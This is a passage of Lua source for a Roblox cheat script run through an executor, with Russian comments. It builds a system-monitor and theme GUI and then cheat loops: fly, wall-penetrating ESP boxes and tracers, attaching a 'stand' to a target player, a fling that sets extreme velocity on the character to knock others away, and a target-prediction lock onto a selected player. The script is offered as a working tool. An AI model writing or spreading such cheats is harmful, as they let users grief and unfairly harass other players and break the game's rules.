MonitorTitle.Position = UDim2.new(0, 20, 0, 0)
MonitorTitle.BackgroundTransparency = 1
MonitorTitle.Text = "⚙️ SYSTEM MONITOR"
MonitorTitle.TextColor3 = Color3.fromRGB(100, 80, 200)
MonitorTitle.Font = Enum.Font.GothamBold
MonitorTitle.TextSize = 16
MonitorTitle.TextXAlignment = Enum.TextXAlignment.Left
MonitorTitle.ZIndex = 152
MonitorTitle.Parent = MonitorTopBar

local CloseMonitorBtn = Instance.new("TextButton")
CloseMonitorBtn.Size = UDim2.new(0, 35, 0, 35)
CloseMonitorBtn.Position = UDim2.new(1, -43, 0, 8)
CloseMonitorBtn.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
CloseMonitorBtn.Text = "×"
CloseMonitorBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
CloseMonitorBtn.Font = Enum.Font.GothamBold
CloseMonitorBtn.TextSize = 22
CloseMonitorBtn.BorderSizePixel = 0
CloseMonitorBtn.ZIndex = 152
CloseMonitorBtn.Parent = MonitorTopBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 6)
CloseCorner.Parent = CloseMonitorBtn

CloseMonitorBtn.MouseEnter:Connect(function()
    TweenService:Create(CloseMonitorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 60, 60)}):Play()
end)
CloseMonitorBtn.MouseLeave:Connect(function()
    TweenService:Create(CloseMonitorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
end)
CloseMonitorBtn.MouseButton1Click:Connect(function() MonitorFrame.Visible = false end)

-- Content Container
local MonitorScroll = Instance.new("ScrollingFrame")
MonitorScroll.Position = UDim2.new(0, 0, 0, 50)
MonitorScroll.Size = UDim2.new(1, 0, 1, -50)
MonitorScroll.BackgroundTransparency = 1
MonitorScroll.BorderSizePixel = 0
MonitorScroll.ScrollBarThickness = 4
MonitorScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 80, 200)
MonitorScroll.CanvasSize = UDim2.new(0, 0, 0, 700)
MonitorScroll.ZIndex = 151
MonitorScroll.Parent = MonitorFrame

local MonitorList = Instance.new("UIListLayout")
MonitorList.HorizontalAlignment = Enum.HorizontalAlignment.Center
MonitorList.Padding = UDim.new(0, 8)
MonitorList.Parent = MonitorScroll

MonitorList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    MonitorScroll.CanvasSize = UDim2.new(0, 0, 0, MonitorList.AbsoluteContentSize.Y + 20)
end)

-- Section Headers
local function createMonitorSection(name)
    local Section = Instance.new("Frame")
    Section.Size = UDim2.new(0.9, 0, 0, 30)
    Section.BackgroundTransparency = 1
    Section.ZIndex = 152
    Section.Parent = MonitorScroll
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = name
    Label.TextColor3 = Color3.fromRGB(100, 100, 100)
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 11
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.ZIndex = 153
    Label.Parent = Section
    
    local Line = Instance.new("Frame")
    Line.Size = UDim2.new(1, 0, 0, 1)
    Line.Position = UDim2.new(0, 0, 1, -1)
    Line.BackgroundColor3 = Color3.fromRGB(26, 24, 34)
    Line.BorderSizePixel = 0
    Line.ZIndex = 153
    Line.Parent = Section
    
    return Section
end

local function createMonitorRow(name, isBtn)
    local Frame = Instance.new("TextButton")
    Frame.Size = UDim2.new(0.9, 0, 0, 38)
    Frame.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
    Frame.AutoButtonColor = false
    Frame.Text = ""
    Frame.ZIndex = 152
    Frame.Parent = MonitorScroll
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 20)
    Corner.Parent = Frame
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -20, 1, 0)
    Label.Position = UDim2.new(0, 15, 0, 0)
    Label.BackgroundTransparency = 1
    Label.TextColor3 = Color3.fromRGB(200, 200, 200)
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Text = name .. ": --"
    Label.ZIndex = 153
    Label.Parent = Frame
    
    if isBtn then
        Frame.MouseEnter:Connect(function()
            TweenService:Create(Frame, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100, 80, 200)}):Play()
        end)
        Frame.MouseLeave:Connect(function()
            TweenService:Create(Frame, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
        end)
    end
    
    return Label, Frame
end

-- System Info Section
createMonitorSection("📊 SYSTEM INFO")
local FPS_Label = createMonitorRow("🖥️ FPS")
local Ping_Label = createMonitorRow("📡 Ping")
local RAM_Label = createMonitorRow("💾 RAM")
local ServerAge_Label = createMonitorRow("⏱️ Server Age")
local Session_Label = createMonitorRow("⌚ Session Time")
local Executor_Label = createMonitorRow("⚡ Executor")
local BuildDate_Label = createMonitorRow("📅 Build Date")
local BuildType_Label = createMonitorRow("🔧 Build Type")

-- Actions Section
createMonitorSection("🎯 ACTIONS")
local Pos_Label, Pos_Btn = createMonitorRow("📍 Position (Click to Copy)", true)
local Rejoin_Label, Rejoin_Btn = createMonitorRow("🔄 Rejoin Server", true)
local GC_Label, GC_Btn = createMonitorRow("🧹 Clean Memory", true)

-- FPS Unlocker Section
createMonitorSection("🚀 FPS UNLOCKER")

local fpsUnlockerSupported = setfpscap ~= nil

if fpsUnlockerSupported then
    local FPSUnlockLabel, FPSUnlockBtn = createMonitorRow("🚀 Unlock FPS (Click)", true)
    
    FPSUnlockBtn.MouseButton1Click:Connect(function()
        pcall(function()
            setfpscap(9999)
            FPSUnlockLabel.Text = "🚀 FPS Unlocked! (Unlimited)"
            TweenService:Create(FPSUnlockBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(100, 255, 140)}):Play()
            task.wait(0.3)
            TweenService:Create(FPSUnlockBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
        end)
    end)
else
    -- Show unsupported message
    local UnsupportedFrame = Instance.new("Frame")
    UnsupportedFrame.Size = UDim2.new(0.9, 0, 0, 38)
    UnsupportedFrame.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
    UnsupportedFrame.BorderSizePixel = 0
    UnsupportedFrame.ZIndex = 152
    UnsupportedFrame.Parent = MonitorScroll
    
    local UnsupportedCorner = Instance.new("UICorner")
    UnsupportedCorner.CornerRadius = UDim.new(0, 20)
    UnsupportedCorner.Parent = UnsupportedFrame
    
    local UnsupportedLabel = Instance.new("TextLabel")
    UnsupportedLabel.Size = UDim2.new(1, -20, 1, 0)
    UnsupportedLabel.Position = UDim2.new(0, 15, 0, 0)
    UnsupportedLabel.BackgroundTransparency = 1
    UnsupportedLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
    UnsupportedLabel.Font = Enum.Font.Gotham
    UnsupportedLabel.TextSize = 11
    UnsupportedLabel.TextXAlignment = Enum.TextXAlignment.Left
    UnsupportedLabel.Text = "⚠️ Not supported by your executor"
    UnsupportedLabel.ZIndex = 153
    UnsupportedLabel.Parent = UnsupportedFrame
end

-- Theme Section
createMonitorSection("🎨 THEME CHANGER")

local ThemeContainer = Instance.new("Frame")
ThemeContainer.Size = UDim2.new(0.9, 0, 0, 50)
ThemeContainer.BackgroundTransparency = 1
ThemeContainer.ZIndex = 152
ThemeContainer.Parent = MonitorScroll

local ThemeLabel = Instance.new("TextLabel")
ThemeLabel.Size = UDim2.new(1, 0, 0, 20)
ThemeLabel.BackgroundTransparency = 1
ThemeLabel.Text = "Current: " .. Themes[CurrentThemeIndex].Name
ThemeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
ThemeLabel.Font = Enum.Font.Gotham
ThemeLabel.TextSize = 11
ThemeLabel.TextXAlignment = Enum.TextXAlignment.Left
ThemeLabel.ZIndex = 153
ThemeLabel.Parent = ThemeContainer

local ThemeButtonsFrame = Instance.new("Frame")
ThemeButtonsFrame.Size = UDim2.new(1, 0, 0, 25)
ThemeButtonsFrame.Position = UDim2.new(0, 0, 0, 25)
ThemeButtonsFrame.BackgroundTransparency = 1
ThemeButtonsFrame.ZIndex = 152
ThemeButtonsFrame.Parent = ThemeContainer

local ThemeButtonsLayout = Instance.new("UIListLayout")
ThemeButtonsLayout.FillDirection = Enum.FillDirection.Horizontal
ThemeButtonsLayout.Padding = UDim.new(0, 6)
ThemeButtonsLayout.Parent = ThemeButtonsFrame

for i, theme in ipairs(Themes) do
    local ThemeBtn = Instance.new("TextButton")
    ThemeBtn.Size = UDim2.new(0, 60, 0, 25)
    ThemeBtn.BackgroundColor3 = theme.Color
    ThemeBtn.Text = theme.Name
    ThemeBtn.Font = Enum.Font.GothamBold
    ThemeBtn.TextSize = 10
    ThemeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ThemeBtn.BorderSizePixel = 0
    ThemeBtn.ZIndex = 153
    ThemeBtn.Parent = ThemeButtonsFrame
    
    local ThemeBtnCorner = Instance.new("UICorner")
    ThemeBtnCorner.CornerRadius = UDim.new(0, 4)
    ThemeBtnCorner.Parent = ThemeBtn
    
    ThemeBtn.MouseButton1Click:Connect(function()
        CurrentThemeIndex = i
        ApplyTheme(theme)
        ThemeLabel.Text = "Current: " .. theme.Name
        TweenService:Create(MonitorStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
        TweenService:Create(MonitorTitle, TweenInfo.new(0.3), {TextColor3 = theme.Color}):Play()
        TweenService:Create(MonitorScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
        -- Обновляем превью кастомного цвета
        for _, child in pairs(MonitorScroll:GetDescendants()) do
            if child.Name == "CustomColorPreview" and child:IsA("Frame") then
                TweenService:Create(child, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                break
            end
        end
    end)
    
    ThemeBtn.MouseEnter:Connect(function()
        TweenService:Create(ThemeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(
            theme.Color.R * 0.8, theme.Color.G * 0.8, theme.Color.B * 0.8
        )}):Play()
    end)
    ThemeBtn.MouseLeave:Connect(function()
        TweenService:Create(ThemeBtn, TweenInfo.new(0.1), {BackgroundColor3 = theme.Color}):Play()
    end)
end

-- ========================================
-- 🔥 ИСПРАВЛЕННЫЙ Custom Color Picker! 🔥
-- ========================================

local CustomColorHeader = Instance.new("TextLabel")
CustomColorHeader.Size = UDim2.new(0.9, 0, 0, 20)
CustomColorHeader.Position = UDim2.new(0, 0, 0, 10)
CustomColorHeader.BackgroundTransparency = 1
CustomColorHeader.Text = "Created by Piscar&Zamorozka"
CustomColorHeader.TextColor3 = Color3.fromRGB(200, 200, 200)
CustomColorHeader.Font = Enum.Font.GothamBold
CustomColorHeader.TextSize = 12
CustomColorHeader.TextXAlignment = Enum.TextXAlignment.Left
CustomColorHeader.ZIndex = 153
CustomColorHeader.Parent = MonitorScroll

local CustomColorBtn = Instance.new("TextButton")
CustomColorBtn.Size = UDim2.new(0.9, 0, 0, 35)
CustomColorBtn.Position = UDim2.new(0, 0, 0, 5)
CustomColorBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
CustomColorBtn.Text = ""
CustomColorBtn.BorderSizePixel = 0
CustomColorBtn.ZIndex = 153
CustomColorBtn.Parent = MonitorScroll

local CustomColorCorner = Instance.new("UICorner")
CustomColorCorner.CornerRadius = UDim.new(0, 8)
CustomColorCorner.Parent = CustomColorBtn

local CustomColorLabel = Instance.new("TextLabel")
CustomColorLabel.Size = UDim2.new(0.6, 0, 1, 0)
CustomColorLabel.Position = UDim2.new(0, 15, 0, 0)
CustomColorLabel.BackgroundTransparency = 1
CustomColorLabel.Text = "Choose Custom Color"
CustomColorLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
CustomColorLabel.Font = Enum.Font.Gotham
CustomColorLabel.TextSize = 13
CustomColorLabel.TextXAlignment = Enum.TextXAlignment.Left
CustomColorLabel.ZIndex = 154
CustomColorLabel.Parent = CustomColorBtn

local CustomColorPreview = Instance.new("Frame")
CustomColorPreview.Name = "CustomColorPreview"
CustomColorPreview.Size = UDim2.new(0, 80, 0, 25)
CustomColorPreview.Position = UDim2.new(1, -90, 0.5, -12.5)
CustomColorPreview.BackgroundColor3 = Themes[CurrentThemeIndex].Color
CustomColorPreview.BorderSizePixel = 0
CustomColorPreview.ZIndex = 154
CustomColorPreview.Parent = CustomColorBtn

local CustomColorPreviewCorner = Instance.new("UICorner")
CustomColorPreviewCorner.CornerRadius = UDim.new(0, 6)
CustomColorPreviewCorner.Parent = CustomColorPreview

-- 🔥 ИСПРАВЛЕННАЯ ФУНКЦИЯ! 🔥
CustomColorBtn.MouseButton1Click:Connect(function()
    OpenColorPicker(CurrentTheme.Color, function(newColor)
        -- Создаем кастомную тему
        local customTheme = {
            Name = "Custom",
            Color = newColor,
            BgDark = Color3.fromRGB(14, 14, 14),
            BgMedium = Color3.fromRGB(16, 14, 22),
            BgLight = Color3.fromRGB(18, 16, 24)
        }
        
        -- Применяем кастомную тему
        ApplyTheme(customTheme)
        
        -- Обновляем превью
        CustomColorPreview.BackgroundColor3 = newColor
        ThemeLabel.Text = "Current: Custom"
        
        -- Обновляем цвета монитора
        TweenService:Create(MonitorStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        TweenService:Create(MonitorTitle, TweenInfo.new(0.3), {TextColor3 = newColor}):Play()
        TweenService:Create(MonitorScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play()
        
        -- КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Обновляем все Toggle switches
        for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
            if page then
                for _, column in pairs(page:GetChildren()) do
                    if column.Name == "LeftColumn" or column.Name == "RightColumn" then
                        for _, toggle in pairs(column:GetChildren()) do
                            if toggle:IsA("Frame") then
                                local switch = toggle:FindFirstChildOfClass("TextButton")
                                if switch then
                                    if switch.BackgroundColor3.R > 0.3 or switch.BackgroundColor3.G > 0.3 or switch.BackgroundColor3.B > 0.3 then
                                        TweenService:Create(switch, TweenInfo.new(0.3), {BackgroundColor3 = newColor}):Play()
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        
        -- Обновляем все слайдеры
        for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
            if page then
                for _, desc in pairs(page:GetDescendants()) do
                    if desc.Name == "SliderFill" or desc.Name == "SliderDot" then
                        TweenService:Create(desc, TweenInfo.new(0.3), {BackgroundColor3 = newColor}):Play()
                    end
                end
            end
        end
        
        -- Обновляем ScrollBars
        if AnimScroll then TweenService:Create(AnimScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play() end
        if QSScroll then TweenService:Create(QSScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play() end
        TweenService:Create(Sidebar, TweenInfo.new(0.3), {ScrollBarImageColor3 = newColor}):Play()
        
        -- Обновляем иконки в Sidebar
        for _, button in pairs(Sidebar:GetChildren()) do
            if button:IsA("TextButton") and button:FindFirstChild("Icon") then
                local icon = button:FindFirstChild("Icon")
                TweenService:Create(icon, TweenInfo.new(0.3), {TextColor3 = newColor}):Play()
            end
        end
        
        -- Обновляем активную кнопку в Sidebar
        if currentActiveButton then
            TweenService:Create(currentActiveButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(80, 60, 140)}):Play()
        end
        
        -- Обновляем Settings кнопку с Stroke
        local settingsStroke = SettingsBtn:FindFirstChildOfClass("UIStroke")
        if not settingsStroke then
            settingsStroke = Instance.new("UIStroke")
            settingsStroke.Thickness = 2
            settingsStroke.Parent = SettingsBtn
        end
        TweenService:Create(settingsStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        
        -- Обновляем MainFrame Stroke
       -- local mainStroke = MainFrame:FindFirstChildOfClass("UIStroke")
       -- if not mainStroke then
          --  mainStroke = Instance.new("UIStroke")
           -- mainStroke.Thickness = 2
           -- mainStroke.Parent = MainFrame
       -- end
       -- TweenService:Create(mainStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        
        -- Обновляем TopBar Stroke
        local topStroke = TopBar:FindFirstChildOfClass("UIStroke")
        if not topStroke then
            topStroke = Instance.new("UIStroke")
            topStroke.Thickness = 1
            topStroke.Transparency = 0.5
            topStroke.Parent = TopBar
        end
        TweenService:Create(topStroke, TweenInfo.new(0.3), {Color = newColor}):Play()
        
        -- Обновляем TimeLabel
        TweenService:Create(TimeLabel, TweenInfo.new(0.3), {TextColor3 = newColor}):Play()
        
        -- Обновляем Watermark
        if wmStroke then TweenService:Create(wmStroke, TweenInfo.new(0.3), {Color = newColor}):Play() end
        if wmGlow then TweenService:Create(wmGlow, TweenInfo.new(0.3), {BackgroundColor3 = newColor}):Play() end
        
        print("✅ Custom theme applied: " .. tostring(newColor))
    end)
end)

CustomColorBtn.MouseEnter:Connect(function()
    TweenService:Create(CustomColorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 50, 65)}):Play()
end)

CustomColorBtn.MouseLeave:Connect(function()
    TweenService:Create(CustomColorBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
end)

-- Button Actions
Pos_Btn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        setclipboard(tostring(char.HumanoidRootPart.Position))
        Pos_Label.Text = "📍 Position: COPIED!"
        task.wait(1.5)
    end
end)

Rejoin_Btn.MouseButton1Click:Connect(function()
    Rejoin_Label.Text = "🔄 Rejoining..."
    task.wait(0.5)
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

GC_Btn.MouseButton1Click:Connect(function()
    local before = math.floor(Stats:GetTotalMemoryUsageMb())
    collectgarbage("collect")
    GC_Label.Text = "🧹 Cleaned! (" .. before .. "MB → " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. "MB)"
    task.wait(2)
end)

-- FPS Counter
local mfps = 0
RunService.RenderStepped:Connect(function(dt) mfps = math.floor(1/dt) end)

-- Stats Update Loop
task.spawn(function()
    local startTime = os.time()
    while task.wait(0.5) do
        if not MonitorFrame.Visible then continue end
        local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
        local serverAge = math.floor(workspace.DistributedGameTime)
        local sessionTime = os.time() - startTime
        local char = LocalPlayer.Character
        local pos = (char and char:FindFirstChild("HumanoidRootPart")) and 
            string.format("%d, %d, %d",
                math.floor(char.HumanoidRootPart.Position.X),
                math.floor(char.HumanoidRootPart.Position.Y),
                math.floor(char.HumanoidRootPart.Position.Z)
            ) or "N/A"
        
        FPS_Label.Text = "🖥️ FPS: " .. mfps
        Ping_Label.Text = "📡 Ping: " .. ping .. " ms"
        RAM_Label.Text = "💾 RAM: " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. " MB"
        ServerAge_Label.Text = string.format("⏱️ Server Age: %02d:%02d:%02d",
            math.floor(serverAge/3600), math.floor((serverAge%3600)/60), serverAge%60)
        Session_Label.Text = string.format("⌚ Session: %02d:%02d:%02d",
            math.floor(sessionTime/3600), math.floor((sessionTime%3600)/60), sessionTime%60)
        Executor_Label.Text = "⚡ Executor: " .. EXECUTOR_NAME
        BuildDate_Label.Text = "📅 Build Date: Feb 08 2026"
        BuildType_Label.Text = "🔧 Build Type: Pre-Alpha"
        Pos_Label.Text = "📍 Position: " .. pos
        Rejoin_Label.Text = "🔄 Rejoin Server"
        GC_Label.Text = "🧹 Clean Memory"
    end
end)

SettingsBtn.MouseButton1Click:Connect(function() MonitorFrame.Visible = not MonitorFrame.Visible end)
SettingsBtn.MouseEnter:Connect(function()
    TweenService:Create(SettingsBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(28, 26, 36)}):Play()
end)
SettingsBtn.MouseLeave:Connect(function()
    TweenService:Create(SettingsBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
end)
end

-- Initialize theme colors on startup
pcall(function()
    task.wait(0.2)
    if ApplyTheme and CurrentTheme then
        ApplyTheme(CurrentTheme)
    end
end)

-- ========================================
-- MOVEMENT & ESP LOOPS
-- ========================================

-- FLY LOOP (отдельно)
RunService.Heartbeat:Connect(function()
    if flyEnabled and LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local cam = workspace.CurrentCamera
        if root and bv and bg then
            local move = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then move = move - Vector3.new(0, 1, 0) end
            if move.Magnitude > 0 then bv.Velocity = move.Unit * flySpeed else bv.Velocity = Vector3.zero end
            bg.CFrame = cam.CFrame
        end
    end
end)

-- ESP LOOP (оптимизированный)
local espLastUpdate = 0
local espUpdateInterval = 0.1

RunService.Heartbeat:Connect(function()
    local now = tick()
    if now - espLastUpdate < espUpdateInterval then return end
    espLastUpdate = now
    
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    for _, plr in Players:GetPlayers() do
        if plr ~= LocalPlayer and plr.Character then
            local char = plr.Character
            local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
            local head = char:FindFirstChild("Head")
            local hum = char:FindFirstChildOfClass("Humanoid")

            local box = char:FindFirstChild("ESPBox")
            if espBoxEnabled and root then
                if not box then
                    box = Instance.new("BoxHandleAdornment", char)
                    box.Name = "ESPBox"
                    box.Adornee = root
                    box.Size = Vector3.new(4, 6, 3)
                    box.Transparency = 0.6
                    box.AlwaysOnTop = true
                    box.ZIndex = 10
                end
                box.Color3 = espBoxColor
            elseif box then 
                box:Destroy() 
            end

            local bill = char:FindFirstChild("ESPName")
            if espNameEnabled and head and hum then
                if not bill then
                    bill = Instance.new("BillboardGui", char)
                    bill.Name = "ESPName"
                    bill.Adornee = head
                    bill.Size = UDim2.new(0, 200, 0, 50)
                    bill.StudsOffset = Vector3.new(0, 3, 0)
                    bill.AlwaysOnTop = true

                    local lbl = Instance.new("TextLabel", bill)
                    lbl.Name = "Label"
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.BackgroundTransparency = 1
                    lbl.TextColor3 = espBoxColor
                    lbl.Font = Enum.Font.SourceSansBold
                    lbl.TextStrokeTransparency = 0
                    lbl.TextSize = espFontSize
                end
                
                local health = math.floor(hum.Health)
                bill.Label.Text = plr.DisplayName .. " [" .. health .. "]"
                bill.Label.TextSize = espFontSize
                bill.Label.TextColor3 = espBoxColor
            elseif bill then 
                bill:Destroy() 
            end

            local distBill = char:FindFirstChild("SecretClubDistance")
            if espDistanceEnabled and root and myRoot then
                if not distBill then
                    distBill = Instance.new("BillboardGui", char)
                    distBill.Name = "SecretClubDistance"
                    distBill.Adornee = root
                    distBill.Size = UDim2.new(0, 200, 0, 30)
                    distBill.StudsOffset = Vector3.new(0, -3, 0)
                    distBill.AlwaysOnTop = true
                    local lbl = Instance.new("TextLabel", distBill)
                    lbl.Name = "Label"
                    lbl.Size = UDim2.new(1, 0, 1, 0)
                    lbl.BackgroundTransparency = 1
                    lbl.TextColor3 = espBoxColor
                    lbl.Font = Enum.Font.SourceSansBold
                    lbl.TextStrokeTransparency = 0
                    lbl.TextSize = espFontSize - 2
                end
                local dist = math.floor((myRoot.Position - root.Position).Magnitude)
                distBill.Label.Text = dist .. "m"
                distBill.Label.TextSize = espFontSize - 2
                distBill.Label.TextColor3 = espBoxColor
            elseif distBill then 
                distBill:Destroy() 
            end

            local tracer = char:FindFirstChild("SecretClubTracer")
            if espTracerEnabled and root then
                if not tracer then
                    local att0 = Instance.new("Attachment", workspace.CurrentCamera)
                    att0.Name = "TracerAttachment0_" .. plr.UserId
                    local att1 = Instance.new("Attachment", root)
                    att1.Name = "TracerAttachment1"
                    tracer = Instance.new("Beam", char)
                    tracer.Name = "SecretClubTracer"
                    tracer.Attachment0 = att0
                    tracer.Attachment1 = att1
                    tracer.Width0 = 0.1
                    tracer.Width1 = 0.1
                    tracer.FaceCamera = true
                end
                tracer.Color = ColorSequence.new(espBoxColor)
            elseif tracer then 
                tracer:Destroy()
                if root:FindFirstChild("TracerAttachment1") then root.TracerAttachment1:Destroy() end
                local cam = workspace.CurrentCamera
                for _, att in cam:GetChildren() do
                    if att.Name == "TracerAttachment0_" .. plr.UserId then 
                        att:Destroy() 
                        break
                    end
                end
            end
        end
    end
end)

-- STAND ATTACH LOOP
local attachLastUpdate = 0
local attachUpdateInterval = 0.033

RunService.Heartbeat:Connect(function()
    if not AttachSettings.attach or not AttachSettings.target then return end
    
    local now = tick()
    if now - attachLastUpdate < attachUpdateInterval then return end
    attachLastUpdate = now
    
    local stand = GetStand()
    local targetChar = workspace.Living:FindFirstChild(AttachSettings.target)
    if stand and targetChar then
        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        if targetRoot then
            stand:SetPrimaryPartCFrame(
                targetRoot.CFrame * 
                CFrame.new(0, AttachSettings.height, -AttachSettings.distance) * 
                CFrame.Angles(0, math.rad(180), 0)
            )
        end
    end
    task.spawn(function()
    while task.wait() do
        if AttachSettings.attach and AttachSettings.target then
            local stand = GetStand()
            local target = SearchPlayer(AttachSettings.target)
            
            if stand and target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                stand:SetPrimaryPartCFrame(
                    target.Character.HumanoidRootPart.CFrame * 
                    CFrame.new(0, AttachSettings.height, -AttachSettings.distance) * 
                    CFrame.Angles(0, math.rad(180), 0)
                )
            end
        end
    end
end)
end)

-- ========================================
-- GHOST HUB FUNCTIONS
-- ========================================

local function GH_PressKey(key)
    vim:SendKeyEvent(true, key, false, game)
    task.wait(0.01)
    vim:SendKeyEvent(false, key, false, game)
end

local function GH_InvisibleReset()
    _G.IsResetting = true
    GH_PressKey(Enum.KeyCode.Escape)
    task.wait(0.15)
    GH_PressKey(Enum.KeyCode.R)
    task.wait(0.25)
    GH_PressKey(Enum.KeyCode.Return)
    task.wait(0.3)
    _G.IsResetting = false
end

task.spawn(function()
    while true do
        if gh_isAutoResetEnabled then
            GH_InvisibleReset()
            task.wait(gh_resetInterval)
        else
            task.wait(0.5)
        end
    end
end)

task.spawn(function()
    RunService.Heartbeat:Connect(function()
        if not gh_isFlingActive then return end
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local oldVelocity = hrp.Velocity
            hrp.Velocity = Vector3.new(500000, 500000, 500000)
            RunService.RenderStepped:Wait()
            hrp.Velocity = oldVelocity
        end
    end)
end)

task.spawn(function()
    local camera = workspace.CurrentCamera
    
    -- 🎯 ИСТОРИЯ ПОЗИЦИЙ ДЛЯ УЛУЧШЕННОГО ПРЕДИКТА
    local positionHistory = {}
    local maxHistorySize = 5
    
    local function updateHistory(targetHRP)
        table.insert(positionHistory, {
            pos = targetHRP.Position,
            vel = targetHRP.Velocity,
            time = tick()
        })
        if #positionHistory > maxHistorySize then
            table.remove(positionHistory, 1)
        end
    end
    
    local function getAverageVelocity()
        if #positionHistory < 2 then return Vector3.zero end
        
        local totalVel = Vector3.zero
        for i = 1, #positionHistory do
            totalVel = totalVel + positionHistory[i].vel
        end
        return totalVel / #positionHistory
    end
    
    while true do
        local myChar = LocalPlayer.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local myHumanoid = myChar and myChar:FindFirstChild("Humanoid")
        local targetChar = gh_selectedPlayer and gh_selectedPlayer.Character
        local targetHRP = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        local targetHead = targetChar and targetChar:FindFirstChild("Head")
        local targetHumanoid = targetChar and targetChar:FindFirstChild("Humanoid")

        -- ✅ ПРОВЕРКА: мёртв или в регдолле?
        local isDead = myHumanoid and myHumanoid.Health <= 0
        local isRagdoll = myHumanoid and (
            myHumanoid.Sit or 
            myHumanoid.PlatformStand or 
            myHumanoid:GetState() == Enum.HumanoidStateType.Ragdoll or
            myHumanoid:GetState() == Enum.HumanoidStateType.FallingDown
        )
        local isDisabled = isDead or isRagdoll

        if gh_isRunning and myHRP and targetHRP and targetHead then
            -- Обновляем историю позиций
            updateHistory(targetHRP)
            
            if not gh_currentBV or gh_currentBV.Parent ~= myHRP then
                if gh_currentBV then gh_currentBV:Destroy() end
                gh_currentBV = Instance.new("BodyVelocity")
                gh_currentBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                gh_currentBV.Parent = myHRP
            end
            
            local predictedPosition
            
            -- 🔥 ЕСЛИ МЁРТВ ИЛИ В РЕГДОЛЛЕ - БЕЗ ПРЕДИКТА!
            if isDisabled then
                predictedPosition = targetHRP.Position
            else
                -- 🎯 СУПЕР УЛУЧШЕННЫЙ ПРЕДИКТ
                
                local basePredict = _G.PredictValue or 0.3
                local currentDistance = (targetHRP.Position - myHRP.Position).Magnitude
                
                -- Используем СРЕДНЮЮ скорость из истории (более стабильно)
                local avgVelocity = getAverageVelocity()
                local currentVelocity = targetHRP.Velocity
